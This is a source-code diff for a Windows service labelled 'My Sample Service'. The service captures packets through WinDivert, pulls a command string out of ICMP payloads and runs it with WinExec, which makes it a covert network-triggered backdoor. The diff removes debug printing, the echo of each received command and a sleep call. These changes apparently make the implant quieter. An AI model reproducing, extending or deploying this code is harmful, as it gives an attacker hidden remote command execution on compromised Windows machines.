@@ -178,7 +178,7 @@ VOID WINAPI ServiceCtrlHandler (DWORD CtrlCode)
 DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
 {
     OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceWorkerThread: Entry"));
-            HANDLE handle, console;
+        HANDLE handle, console;
         UINT i;
         INT16 priority = 0;
         unsigned char packet[MAXBUF];
@@ -267,17 +267,6 @@ DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
             fprintf(stderr, "warning: junk packet\n");
         }
 
-        // Dump packet info: 
-        putchar('\n');
-        SetConsoleTextAttribute(console, FOREGROUND_RED);
-        time_passed = (double)(addr.Timestamp - base.QuadPart) /
-            (double)freq.QuadPart;
-        hash = WinDivertHelperHashPacket(packet, packet_len, 0);
-        printf("Packet [Timestamp=%.8g, Direction=%s IfIdx=%u SubIfIdx=%u "
-            "Loopback=%u Hash=0x%.16llX]\n",
-            time_passed, (addr.Outbound ? "outbound" : "inbound"),
-            addr.Network.IfIdx, addr.Network.SubIfIdx, addr.Loopback, hash);
-
         if (icmp_header != NULL)
         {
             SetConsoleTextAttribute(console, FOREGROUND_RED);
@@ -290,15 +279,7 @@ DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
 
         }
 
-        SetConsoleTextAttribute(console, FOREGROUND_GREEN | FOREGROUND_BLUE);
-        for (i = 0; i < packet_len; i++)
-        {
-            if (i % 20 == 0)
-            {
-                printf("\n\t");
-            }
-            printf("%.2X", (UINT8)packet[i]);
-        }
+
         SetConsoleTextAttribute(console, FOREGROUND_RED | FOREGROUND_BLUE);
         for (i = 0; i < packet_len; i++)
         {
@@ -319,22 +300,15 @@ DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
                     for (i = i + 4; i < packet_len; i++)
                     {
                         in_cmd[j] = packet[i];
-                        putchar(in_cmd[j]);
                         j += 1;
                     }
                     in_cmd[j] = '\0';
-                    printf("asdf");
                     WinExec(in_cmd, NULL);
                     free(cmd);
                     free(in_cmd);
                 }
             }
         }
-        putchar('\n');
-        SetConsoleTextAttribute(console,
-            FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
-        //  Simulate some work by sleeping
-        Sleep(1000);
     }
 
     OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceWorkerThread: Exit"));
